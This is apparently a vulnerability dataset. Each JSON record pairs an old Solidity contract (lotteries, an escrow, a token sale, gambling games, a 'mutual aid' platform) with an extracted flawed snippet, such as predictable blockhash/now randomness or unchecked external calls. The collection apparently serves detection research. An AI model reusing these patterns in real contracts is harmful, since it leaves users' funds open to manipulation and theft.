[{
  "_id": {
    "$oid": "663abc67750a970a4fdc0b0c"
  },
  "filename": "0.sol",
  "content": "pragma solidity ^0.4.24;\ncontract BREBuy {\n struct ContractParam {\n uint32 totalSize ;\n uint256 singlePrice;\n uint8 pumpRate;\n bool hasChange;\n }\n address owner = 0x0;\n uint32 gameIndex = 0;\n uint256 totalPrice= 0;\n bool isLock = false;\n ContractParam public setConfig;\n ContractParam public curConfig;\n address[] public addressArray = new address[](0);\n event openLockEvent();\n event addPlayerEvent(uint32 gameIndex,address player);\n event gameOverEvent(uint32 gameIndex,uint32 totalSize,uint256 singlePrice,uint8 pumpRate,address winAddr,uint overTime);\n event stopGameEvent(uint totalBalace,uint totalSize,uint price);\n constructor ( uint32 _totalSize,\n uint256 _singlePrice\n ) public {\n owner = msg.sender;\n setConfig = ContractParam(_totalSize,_singlePrice * 1 finney ,5,false);\n curConfig = ContractParam(_totalSize,_singlePrice * 1 finney ,5,false);\n startNewGame();\n }\n modifier onlyOwner {\n require(msg.sender == owner,\"only owner can call this function\");\n _;\n }\n modifier notLock {\n require(isLock == false,\"contract current is lock status\");\n _;\n }\n function isNotContract(address addr) private view returns (bool) {\n uint size;\n assembly { size := extcodesize(addr) }\n return size <= 0;\n }\n function updateLock(bool b) onlyOwner public {\n require(isLock != b,\" updateLock new status == old status\");\n isLock = b;\n if(isLock) {\n stopGame();\n }else{\n startNewGame();\n emit openLockEvent();\n }\n }\n function stopGame() onlyOwner private {\n if(addressArray.length <= 0) {\n return;\n }\n uint totalBalace = address(this).balance;\n uint price = totalBalace / addressArray.length;\n for(uint i = 0; i < addressArray.length; i++) {\n address curPlayer = addressArray[i];\n curPlayer.transfer(price);\n }\n emit stopGameEvent(totalBalace,addressArray.length,price);\n addressArray.length=0;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n function changeConfig( uint32 _totalSize,uint256 _singlePrice,uint8 _pumpRate) onlyOwner public payable {\n curConfig.hasChange = true;\n if(setConfig.totalSize != _totalSize) {\n setConfig.totalSize = _totalSize;\n }\n if(setConfig.pumpRate != _pumpRate){\n setConfig.pumpRate = _pumpRate;\n }\n if(setConfig.singlePrice != _singlePrice * 1 finney){\n setConfig.singlePrice = _singlePrice * 1 finney;\n }\n }\n function startNewGame() private {\n gameIndex++;\n if(curConfig.hasChange) {\n if(curConfig.totalSize != setConfig.totalSize) {\n curConfig.totalSize = setConfig.totalSize;\n }\n if(curConfig.singlePrice != setConfig.singlePrice){\n curConfig.singlePrice = setConfig.singlePrice;\n }\n if( curConfig.pumpRate != setConfig.pumpRate) {\n curConfig.pumpRate = setConfig.pumpRate;\n }\n curConfig.hasChange = false;\n }\n addressArray.length=0;\n }\n function getGameInfo() public view returns (uint256,uint32,uint256,uint8,address[],uint256,bool) {\n return (gameIndex,\n curConfig.totalSize,\n curConfig.singlePrice,\n curConfig.pumpRate,\n addressArray,\n totalPrice,\n isLock);\n }\n function gameResult() private {\n uint index = getRamdon();\n address lastAddress = addressArray[index];\n uint totalBalace = address(this).balance;\n uint giveToOwn = totalBalace * curConfig.pumpRate / 100;\n uint giveToActor = totalBalace - giveToOwn;\n owner.transfer(giveToOwn);\n lastAddress.transfer(giveToActor);\n emit gameOverEvent(\n gameIndex,\n curConfig.totalSize,\n curConfig.singlePrice,\n curConfig.pumpRate,\n lastAddress,\n now);\n }\n function getRamdon() private view returns (uint) {\n bytes32 ramdon = keccak256(abi.encodePacked(ramdon,now,blockhash(block.number-1)));\n for(uint i = 0; i < addressArray.length; i++) {\n ramdon = keccak256(abi.encodePacked(ramdon,now, addressArray[i]));\n }\n uint index = uint(ramdon) % addressArray.length;\n return index;\n }\n function() notLock payable public{\n require(msg.sender == tx.origin, \"msg.sender must equipt tx.origin\");\n require(isNotContract(msg.sender),\"msg.sender not is Contract\");\n require(msg.value == curConfig.singlePrice,\"msg.value error\");\n totalPrice = totalPrice + msg.value;\n addressArray.push(msg.sender);\n emit addPlayerEvent(gameIndex,msg.sender);\n if(addressArray.length >= curConfig.totalSize) {\n gameResult();\n startNewGame();\n }\n }\n}",
  "extract_feature": [
    "function getRamdon() private view returns (uint) {\nbytes32 ramdon = keccak256(abi.encodePacked(ramdon,now,blockhash(block.number-1)));\nfor(uint i = 0; i < addressArray.length; i++) {\nramdon = keccak256(abi.encodePacked(ramdon,now, addressArray[i]));\n}\nuint index = uint(ramdon) % addressArray.length;\nreturn index;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc67750a970a4fdc0b0d"
  },
  "filename": "1011.sol",
  "content": "pragma solidity 0.4.23;\nlibrary SafeMath {\n function mul(uint256 _a, uint256 _b) internal pure returns (uint256) {\n if (_a == 0) {\n return 0;\n }\n uint256 c = _a * _b;\n assert(c / _a == _b);\n return c;\n }\n function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\n uint256 c = _a / _b;\n return c;\n }\n function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\n assert(_b <= _a);\n uint256 c = _a - _b;\n return c;\n }\n function add(uint256 _a, uint256 _b) internal pure returns (uint256) {\n uint256 c = _a + _b;\n assert(c >= _a);\n return c;\n }\n}\ncontract PasswordEscrow {\n using SafeMath for uint256;\n address public owner;\n uint256 public commissionFee;\n uint256 public totalFee;\n uint256 private randSeed = 50;\n struct Transfer {\n address from;\n uint256 amount;\n }\n mapping(bytes32 => Transfer) private password;\n mapping(address => uint256) private randToAddress;\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n event LogChangeCommissionFee(uint256 fee);\n event LogChangeOwner(address indexed exOwner, address indexed newOwner);\n event LogDeposit(address indexed from, uint256 amount);\n event LogGetTransfer(address indexed from, address indexed recipient, uint256 amount);\n constructor(uint256 _fee) public {\n commissionFee = _fee;\n owner = msg.sender;\n }\n function changeCommissionFee(uint256 _fee) public onlyOwner {\n commissionFee = _fee;\n emit LogChangeCommissionFee(_fee);\n }\n function changeOwner(address _newOwner) public onlyOwner {\n emit LogChangeOwner(owner, _newOwner);\n owner = _newOwner;\n }\n function deposit(bytes32 _password) public payable {\n require(msg.value > commissionFee);\n uint256 rand = _rand();\n bytes32 pass = sha3(_password, rand);\n randToAddress[msg.sender] = rand;\n password[pass].from = msg.sender;\n password[pass].amount = password[pass].amount.add(msg.value);\n _updateSeed();\n emit LogDeposit(msg.sender, msg.value);\n }\n function _rand() private view returns(uint256) {\n uint256 rand = uint256(sha3(now, block.number, randSeed));\n return rand %= (10 ** 6);\n }\n function _updateSeed() private {\n randSeed = _rand();\n }\n function viewRand() public view returns(uint256) {\n return randToAddress[msg.sender];\n }\n function getTransfer(bytes32 _password, uint256 _number) public {\n require(password[sha3(_password, _number)].amount > 0);\n bytes32 pass = sha3(_password, _number);\n address from = password[pass].from;\n uint256 amount = password[pass].amount;\n amount = amount.sub(commissionFee);\n totalFee = totalFee.add(commissionFee);\n _updateSeed();\n password[pass].amount = 0;\n msg.sender.transfer(amount);\n emit LogGetTransfer(from, msg.sender, amount);\n }\n function withdrawFee() public payable onlyOwner {\n require( totalFee > 0);\n uint256 fee = totalFee;\n totalFee = 0;\n owner.transfer(fee);\n }\n function withdraw() public payable onlyOwner {\n owner.transfer(this.balance);\n }\n}",
  "extract_feature": [
    "function _rand() private view returns(uint256) {\nuint256 rand = uint256(sha3(now, block.number, randSeed));\nreturn rand %= (10 ** 6);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc67750a970a4fdc0b0e"
  },
  "filename": "103.sol",
  "content": "pragma solidity ^0.4.24;\ncontract IMigrationContract {\n function migrate(address addr, uint256 nas) returns (bool success);\n}\ncontract SafeMath {\n function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x + y;\n assert((z >= x) && (z >= y));\n return z;\n }\n function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\n assert(x >= y);\n uint256 z = x - y;\n return z;\n }\n function safeMult(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x * y;\n assert((x == 0)||(z/x == y));\n return z;\n }\n}\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract EBLLToken is StandardToken, SafeMath {\n string public constant name = \"易宝链\";\n string public constant symbol = \"EBL\";\n uint256 public constant decimals = 18;\n string public version = \"1.0\";\n address public ethFundDeposit;\n address public newContractAddr;\n bool public isFunding;\n uint256 public fundingStartBlock;\n uint256 public fundingStopBlock;\n uint256 public currentSupply;\n uint256 public tokenRaised = 0;\n uint256 public tokenMigrated = 0;\n uint256 public tokenExchangeRate = 5963;\n event AllocateToken(address indexed _to, uint256 _value);\n event IssueToken(address indexed _to, uint256 _value);\n event IncreaseSupply(uint256 _value);\n event DecreaseSupply(uint256 _value);\n event Migrate(address indexed _to, uint256 _value);\n function formatDecimals(uint256 _value) internal returns (uint256 ) {\n return _value * 10 ** decimals;\n }\n function EBLLToken(\n address _ethFundDeposit,\n uint256 _currentSupply)\n {\n ethFundDeposit = _ethFundDeposit;\n isFunding = false;\n fundingStartBlock = 0;\n fundingStopBlock = 0;\n currentSupply = formatDecimals(_currentSupply);\n totalSupply = formatDecimals(1600000000);\n balances[msg.sender] = totalSupply;\n if(currentSupply > totalSupply) throw;\n }\n modifier isOwner() { require(msg.sender == ethFundDeposit); _; }\n function setTokenExchangeRate(uint256 _tokenExchangeRate) isOwner external {\n if (_tokenExchangeRate == 0) throw;\n if (_tokenExchangeRate == tokenExchangeRate) throw;\n tokenExchangeRate = _tokenExchangeRate;\n }\n function increaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + currentSupply > totalSupply) throw;\n currentSupply = safeAdd(currentSupply, value);\n IncreaseSupply(value);\n }\n function decreaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + tokenRaised > currentSupply) throw;\n currentSupply = safeSubtract(currentSupply, value);\n DecreaseSupply(value);\n }\n function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\n if (isFunding) throw;\n if (_fundingStartBlock >= _fundingStopBlock) throw;\n if (block.number >= _fundingStartBlock) throw;\n fundingStartBlock = _fundingStartBlock;\n fundingStopBlock = _fundingStopBlock;\n isFunding = true;\n }\n function stopFunding() isOwner external {\n if (!isFunding) throw;\n isFunding = false;\n }\n function setMigrateContract(address _newContractAddr) isOwner external {\n if (_newContractAddr == newContractAddr) throw;\n newContractAddr = _newContractAddr;\n }\n function changeOwner(address _newFundDeposit) isOwner() external {\n if (_newFundDeposit == address(0x0)) throw;\n ethFundDeposit = _newFundDeposit;\n }\n function migrate() external {\n if(isFunding) throw;\n if(newContractAddr == address(0x0)) throw;\n uint256 tokens = balances[msg.sender];\n if (tokens == 0) throw;\n balances[msg.sender] = 0;\n tokenMigrated = safeAdd(tokenMigrated, tokens);\n IMigrationContract newContract = IMigrationContract(newContractAddr);\n if (!newContract.migrate(msg.sender, tokens)) throw;\n Migrate(msg.sender, tokens);\n }\n function transferETH() isOwner external {\n if (this.balance == 0) throw;\n if (!ethFundDeposit.send(this.balance)) throw;\n }\n function allocateToken (address _addr, uint256 _eth) isOwner external {\n if (_eth == 0) throw;\n if (_addr == address(0x0)) throw;\n uint256 tokens = safeMult(formatDecimals(_eth), tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[_addr] += tokens;\n AllocateToken(_addr, tokens);\n }\n function () payable {\n if (!isFunding) throw;\n if (msg.value == 0) throw;\n if (block.number < fundingStartBlock) throw;\n if (block.number > fundingStopBlock) throw;\n uint256 tokens = safeMult(msg.value, tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[msg.sender] += tokens;\n IssueToken(msg.sender, tokens);\n }\n}",
  "extract_feature": [
    "function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\nif (isFunding) throw;\nif (_fundingStartBlock >= _fundingStopBlock) throw;\nif (block.number >= _fundingStartBlock) throw;\nfundingStartBlock = _fundingStartBlock;\nfundingStopBlock = _fundingStopBlock;\nisFunding = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc67750a970a4fdc0b0f"
  },
  "filename": "1034.sol",
  "content": "pragma solidity ^0.4.21;\ncontract PoCGame\n{\n modifier onlyOwner()\n {\n require(msg.sender == owner);\n _;\n }\n modifier isOpenToPublic()\n {\n require(openToPublic);\n _;\n }\n modifier onlyRealPeople()\n {\n require (msg.sender == tx.origin);\n _;\n }\n modifier onlyPlayers()\n {\n require (wagers[msg.sender] > 0);\n _;\n }\n event Wager(uint256 amount, address depositer);\n event Win(uint256 amount, address paidTo);\n event Lose(uint256 amount, address loser);\n event Donate(uint256 amount, address paidTo, address donator);\n event DifficultyChanged(uint256 currentDifficulty);\n event BetLimitChanged(uint256 currentBetLimit);\n address private whale;\n uint256 betLimit;\n uint difficulty;\n uint private randomSeed;\n address owner;\n mapping(address => uint256) timestamps;\n mapping(address => uint256) wagers;\n bool openToPublic;\n uint256 totalDonated;\n constructor(address whaleAddress, uint256 wagerLimit)\n onlyRealPeople()\n public\n {\n openToPublic = false;\n owner = msg.sender;\n whale = whaleAddress;\n totalDonated = 0;\n betLimit = wagerLimit;\n }\n function OpenToThePublic()\n onlyOwner()\n public\n {\n openToPublic = true;\n }\n function AdjustBetAmounts(uint256 amount)\n onlyOwner()\n public\n {\n betLimit = amount;\n emit BetLimitChanged(betLimit);\n }\n function AdjustDifficulty(uint256 amount)\n onlyOwner()\n public\n {\n difficulty = amount;\n emit DifficultyChanged(difficulty);\n }\n function() public payable { }\n function wager()\n isOpenToPublic()\n onlyRealPeople()\n payable\n public\n {\n require(msg.value == betLimit);\n require(wagers[msg.sender] == 0);\n timestamps[msg.sender] = block.number;\n wagers[msg.sender] = msg.value;\n emit Wager(msg.value, msg.sender);\n }\n function play()\n isOpenToPublic()\n onlyRealPeople()\n onlyPlayers()\n public\n {\n uint256 blockNumber = timestamps[msg.sender];\n if(blockNumber < block.number)\n {\n timestamps[msg.sender] = 0;\n wagers[msg.sender] = 0;\n uint256 winningNumber = uint256(keccak256(abi.encodePacked(blockhash(blockNumber), msg.sender)))%difficulty +1;\n if(winningNumber == difficulty / 2)\n {\n payout(msg.sender);\n }\n else\n {\n loseWager(betLimit / 2);\n }\n }\n else\n {\n revert();\n }\n }\n function donate()\n isOpenToPublic()\n public\n payable\n {\n donateToWhale(msg.value);\n }\n function payout(address winner)\n internal\n {\n uint256 ethToTransfer = address(this).balance / 2;\n winner.transfer(ethToTransfer);\n emit Win(ethToTransfer, winner);\n }\n function donateToWhale(uint256 amount)\n internal\n {\n whale.call.value(amount)(bytes4(keccak256(\"donate()\")));\n totalDonated += amount;\n emit Donate(amount, whale, msg.sender);\n }\n function loseWager(uint256 amount)\n internal\n {\n whale.call.value(amount)(bytes4(keccak256(\"donate()\")));\n totalDonated += amount;\n emit Lose(amount, msg.sender);\n }\n function ethBalance()\n public\n view\n returns (uint256)\n {\n return address(this).balance;\n }\n function currentDifficulty()\n public\n view\n returns (uint256)\n {\n return difficulty;\n }\n function currentBetLimit()\n public\n view\n returns (uint256)\n {\n return betLimit;\n }\n function hasPlayerWagered(address player)\n public\n view\n returns (bool)\n {\n if(wagers[player] > 0)\n {\n return true;\n }\n else\n {\n return false;\n }\n }\n function winnersPot()\n public\n view\n returns (uint256)\n {\n return address(this).balance / 2;\n }\n function transferAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens)\n public\n onlyOwner()\n returns (bool success)\n {\n return ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);\n }\n}\ncontract ERC20Interface\n{\n function transfer(address to, uint256 tokens) public returns (bool success);\n}",
  "extract_feature": [
    "function() public payable { }\nfunction wager()\nisOpenToPublic()\nonlyRealPeople()\npayable\npublic\n{\nrequire(msg.value == betLimit);\nrequire(wagers[msg.sender] == 0);\ntimestamps[msg.sender] = block.number;\nwagers[msg.sender] = msg.value;\nemit Wager(msg.value, msg.sender);\n}\nfunction play()\nisOpenToPublic()\nonlyRealPeople()\nonlyPlayers()\npublic\n{\nuint256 blockNumber = timestamps[msg.sender];\nif(blockNumber < block.number)\n{\ntimestamps[msg.sender] = 0;\nwagers[msg.sender] = 0;\nuint256 winningNumber = uint256(keccak256(abi.encodePacked(blockhash(blockNumber), msg.sender)))%difficulty +1;\nif(winningNumber == difficulty / 2)\n{\npayout(msg.sender);\n}\nelse\n{\nloseWager(betLimit / 2);\n}\n}\nelse\n{\nrevert();\n}\n}\nfunction donate()\nisOpenToPublic()\npublic\npayable\n{\ndonateToWhale(msg.value);\n}\nfunction payout(address winner)\ninternal\n{\nuint256 ethToTransfer = address(this).balance / 2;\nwinner.transfer(ethToTransfer);\nemit Win(ethToTransfer, winner);\n}\nfunction donateToWhale(uint256 amount)\ninternal\n{\nwhale.call.value(amount)(bytes4(keccak256(\"donate()\")));\ntotalDonated += amount;\nemit Donate(amount, whale, msg.sender);\n}\nfunction loseWager(uint256 amount)\ninternal\n{\nwhale.call.value(amount)(bytes4(keccak256(\"donate()\")));\ntotalDonated += amount;\nemit Lose(amount, msg.sender);\n}\nfunction ethBalance()\npublic\nview\nreturns (uint256)\n{\nreturn address(this).balance;\n}\nfunction currentDifficulty()\npublic\nview\nreturns (uint256)\n{\nreturn difficulty;\n}\nfunction currentBetLimit()\npublic\nview\nreturns (uint256)\n{\nreturn betLimit;\n}\nfunction hasPlayerWagered(address player)\npublic\nview\nreturns (bool)\n{\nif(wagers[player] > 0)\n{\nreturn true;\n}\nelse\n{\nreturn false;\n}\n}\nfunction winnersPot()\npublic\nview\nreturns (uint256)\n{\nreturn address(this).balance / 2;\n}\nfunction transferAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens)\npublic\nonlyOwner()\nreturns (bool success)\n{\nreturn ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc67750a970a4fdc0b10"
  },
  "filename": "1044.sol",
  "content": "pragma solidity ^0.4.21;\ncontract PoCGame\n{\n modifier onlyOwner()\n {\n require(msg.sender == owner);\n _;\n }\n modifier isOpenToPublic()\n {\n require(openToPublic);\n _;\n }\n modifier onlyRealPeople()\n {\n require (msg.sender == tx.origin);\n _;\n }\n modifier onlyPlayers()\n {\n require (wagers[msg.sender] > 0);\n _;\n }\n event Wager(uint256 amount, address depositer);\n event Win(uint256 amount, address paidTo);\n event Lose(uint256 amount, address loser);\n event Donate(uint256 amount, address paidTo, address donator);\n event DifficultyChanged(uint256 currentDifficulty);\n event BetLimitChanged(uint256 currentBetLimit);\n address private whale;\n uint256 betLimit;\n uint difficulty;\n uint private randomSeed;\n address owner;\n mapping(address => uint256) timestamps;\n mapping(address => uint256) wagers;\n bool openToPublic;\n uint256 totalDonated;\n constructor(address whaleAddress, uint256 wagerLimit)\n onlyRealPeople()\n public\n {\n openToPublic = false;\n owner = msg.sender;\n whale = whaleAddress;\n totalDonated = 0;\n betLimit = wagerLimit;\n }\n function OpenToThePublic()\n onlyOwner()\n public\n {\n openToPublic = true;\n }\n function AdjustBetAmounts(uint256 amount)\n onlyOwner()\n public\n {\n betLimit = amount;\n emit BetLimitChanged(betLimit);\n }\n function AdjustDifficulty(uint256 amount)\n onlyOwner()\n public\n {\n difficulty = amount;\n emit DifficultyChanged(difficulty);\n }\n function() public payable { }\n function wager()\n isOpenToPublic()\n onlyRealPeople()\n payable\n public\n {\n require(msg.value == betLimit);\n timestamps[msg.sender] = block.number;\n wagers[msg.sender] = msg.value;\n emit Wager(msg.value, msg.sender);\n }\n function play()\n isOpenToPublic()\n onlyRealPeople()\n onlyPlayers()\n public\n {\n uint256 blockNumber = timestamps[msg.sender];\n if(blockNumber < block.number)\n {\n timestamps[msg.sender] = 0;\n wagers[msg.sender] = 0;\n uint256 winningNumber = uint256(keccak256(abi.encodePacked(blockhash(blockNumber), msg.sender)))%difficulty +1;\n if(winningNumber == difficulty / 2)\n {\n payout(msg.sender);\n }\n else\n {\n loseWager(betLimit / 2);\n }\n }\n else\n {\n revert();\n }\n }\n function donate()\n isOpenToPublic()\n public\n payable\n {\n donateToWhale(msg.value);\n }\n function payout(address winner)\n internal\n {\n uint256 ethToTransfer = address(this).balance / 2;\n winner.transfer(ethToTransfer);\n emit Win(ethToTransfer, winner);\n }\n function donateToWhale(uint256 amount)\n internal\n {\n whale.call.value(amount)(bytes4(keccak256(\"donate()\")));\n totalDonated += amount;\n emit Donate(amount, whale, msg.sender);\n }\n function loseWager(uint256 amount)\n internal\n {\n whale.call.value(amount)(bytes4(keccak256(\"donate()\")));\n totalDonated += amount;\n emit Lose(amount, msg.sender);\n }\n function ethBalance()\n public\n view\n returns (uint256)\n {\n return address(this).balance;\n }\n function currentDifficulty()\n public\n view\n returns (uint256)\n {\n return difficulty;\n }\n function currentBetLimit()\n public\n view\n returns (uint256)\n {\n return betLimit;\n }\n function hasPlayerWagered(address player)\n public\n view\n returns (bool)\n {\n if(wagers[player] > 0)\n {\n return true;\n }\n else\n {\n return false;\n }\n }\n function winnersPot()\n public\n view\n returns (uint256)\n {\n return address(this).balance / 2;\n }\n function transferAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens)\n public\n onlyOwner()\n returns (bool success)\n {\n return ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);\n }\n}\ncontract ERC20Interface\n{\n function transfer(address to, uint256 tokens) public returns (bool success);\n}",
  "extract_feature": [
    "function() public payable { }\nfunction wager()\nisOpenToPublic()\nonlyRealPeople()\npayable\npublic\n{\nrequire(msg.value == betLimit);\ntimestamps[msg.sender] = block.number;\nwagers[msg.sender] = msg.value;\nemit Wager(msg.value, msg.sender);\n}\nfunction play()\nisOpenToPublic()\nonlyRealPeople()\nonlyPlayers()\npublic\n{\nuint256 blockNumber = timestamps[msg.sender];\nif(blockNumber < block.number)\n{\ntimestamps[msg.sender] = 0;\nwagers[msg.sender] = 0;\nuint256 winningNumber = uint256(keccak256(abi.encodePacked(blockhash(blockNumber), msg.sender)))%difficulty +1;\nif(winningNumber == difficulty / 2)\n{\npayout(msg.sender);\n}\nelse\n{\nloseWager(betLimit / 2);\n}\n}\nelse\n{\nrevert();\n}\n}\nfunction donate()\nisOpenToPublic()\npublic\npayable\n{\ndonateToWhale(msg.value);\n}\nfunction payout(address winner)\ninternal\n{\nuint256 ethToTransfer = address(this).balance / 2;\nwinner.transfer(ethToTransfer);\nemit Win(ethToTransfer, winner);\n}\nfunction donateToWhale(uint256 amount)\ninternal\n{\nwhale.call.value(amount)(bytes4(keccak256(\"donate()\")));\ntotalDonated += amount;\nemit Donate(amount, whale, msg.sender);\n}\nfunction loseWager(uint256 amount)\ninternal\n{\nwhale.call.value(amount)(bytes4(keccak256(\"donate()\")));\ntotalDonated += amount;\nemit Lose(amount, msg.sender);\n}\nfunction ethBalance()\npublic\nview\nreturns (uint256)\n{\nreturn address(this).balance;\n}\nfunction currentDifficulty()\npublic\nview\nreturns (uint256)\n{\nreturn difficulty;\n}\nfunction currentBetLimit()\npublic\nview\nreturns (uint256)\n{\nreturn betLimit;\n}\nfunction hasPlayerWagered(address player)\npublic\nview\nreturns (bool)\n{\nif(wagers[player] > 0)\n{\nreturn true;\n}\nelse\n{\nreturn false;\n}\n}\nfunction winnersPot()\npublic\nview\nreturns (uint256)\n{\nreturn address(this).balance / 2;\n}\nfunction transferAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens)\npublic\nonlyOwner()\nreturns (bool success)\n{\nreturn ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc67750a970a4fdc0b11"
  },
  "filename": "1058.sol",
  "content": "pragma solidity ^0.4.24;\ncontract EscapeMmmEvents {\n event onOffered (\n address indexed playerAddress,\n uint256 offerAmount,\n address affiliateAddress,\n address siteOwner,\n uint256 timestamp\n );\n event onAccepted (\n address indexed playerAddress,\n uint256 acceptAmount\n );\n event onWithdraw (\n address indexed playerAddress,\n uint256 withdrawAmount\n );\n event onAirDrop (\n address indexed playerAddress,\n uint256 airdropAmount,\n uint256 offerAmount\n );\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract EFMAPlatform is EscapeMmmEvents, Ownable {\n using SafeMath for *;\n string constant public name = \"Escape Financial Mutual Aid Platform\";\n string constant public symbol = \"EFMAP\";\n address private xTokenAddress = 0xfe8b40a35ff222c8475385f74e77d33954531b41;\n uint8 public feePercent_ = 1;\n uint8 public affPercent_ = 5;\n uint8 public sitePercent_ = 5;\n uint8 public airDropPercent_ = 10;\n uint8 public xTokenPercent_ = 3;\n uint256 constant public interestPeriod_ = 1 hours;\n uint256 constant public maxInterestTime_ = 7 days;\n uint256 public airDropPool_;\n uint256 public airDropTracker_ = 0;\n mapping (address => FMAPDatasets.Player) public players_;\n mapping (address => mapping (uint256 => FMAPDatasets.OfferInfo)) public playerOfferOrders_;\n mapping (address => mapping (uint256 => uint256)) public playerAcceptOrders_;\n uint256 private restOfferAmount_ = 0;\n FMAPDatasets.AcceptOrder private currentOrder_;\n mapping (uint256 => FMAPDatasets.AcceptOrder) public acceptOrders_;\n address private teamXWallet;\n uint256 public _totalFee;\n uint256 public _totalXT;\n constructor() public {\n teamXWallet = msg.sender;\n FMAPDatasets.AcceptOrder memory ao;\n ao.nextOrder = 1;\n ao.playerAddress = msg.sender;\n ao.acceptAmount = 1 finney;\n acceptOrders_[0] = ao;\n currentOrder_ = ao;\n }\n function transFee() public onlyOwner {\n teamXWallet.transfer(_totalFee);\n }\n function setTeamWallet(address wallet) public onlyOwner {\n teamXWallet = wallet;\n }\n function setXToken(address xToken) public onlyOwner {\n xTokenAddress = xToken;\n }\n modifier isHuman() {\n require(AddressUtils.isContract(msg.sender) == false, \"sorry, only human allowed\");\n _;\n }\n function() isHuman() public payable {\n FMAPDatasets.OfferInfo memory offerInfo = packageOfferInfo(address(0), msg.value);\n offerCore(offerInfo, false);\n }\n function offerHelp(address siteOwner, address affiliate) isHuman() public payable {\n FMAPDatasets.OfferInfo memory offerInfo = packageOfferInfo(siteOwner, msg.value);\n bool updateAff = false;\n if(affiliate != address(0) && affiliate != offerInfo.affiliateAddress) {\n offerInfo.affiliateAddress = affiliate;\n updateAff = true;\n }\n offerCore(offerInfo, updateAff);\n emit onOffered(offerInfo.playerAddress, offerInfo.offerAmount, offerInfo.affiliateAddress, offerInfo.siteOwner, offerInfo.timestamp);\n }\n function offerHelpUsingBalance(address siteOwner, address affiliate, uint256 ethAmount) isHuman() public {\n require(ethAmount <= players_[msg.sender].balance, \"sorry, you don't have enough balance\");\n FMAPDatasets.OfferInfo memory offerInfo = packageOfferInfo(siteOwner, ethAmount);\n bool updateAff = false;\n if(affiliate != address(0) && affiliate != offerInfo.affiliateAddress) {\n offerInfo.affiliateAddress = affiliate;\n updateAff = true;\n }\n players_[msg.sender].balance = players_[msg.sender].balance.sub(ethAmount);\n offerCore(offerInfo, updateAff);\n emit onOffered(offerInfo.playerAddress, offerInfo.offerAmount, offerInfo.affiliateAddress, offerInfo.siteOwner, offerInfo.timestamp);\n }\n function acceptHelp(uint256 amount) isHuman() public returns (uint256 canAcceptLeft) {\n (canAcceptLeft, ) = calcCanAcceptAmount(msg.sender, true, 0);\n require(amount <= canAcceptLeft, \"sorry, you don't have enough acceptable amount\");\n uint256 _nextOrderId = currentOrder_.nextOrder;\n FMAPDatasets.AcceptOrder memory acceptOrder;\n acceptOrder.playerAddress = msg.sender;\n acceptOrder.acceptAmount = amount;\n acceptOrder.acceptedAmount = 0;\n acceptOrder.nextOrder = _nextOrderId + 1;\n acceptOrders_[_nextOrderId] = acceptOrder;\n if (currentOrder_.orderId == _nextOrderId || currentOrder_.acceptAmount == currentOrder_.acceptedAmount) {\n currentOrder_ = acceptOrder;\n }\n 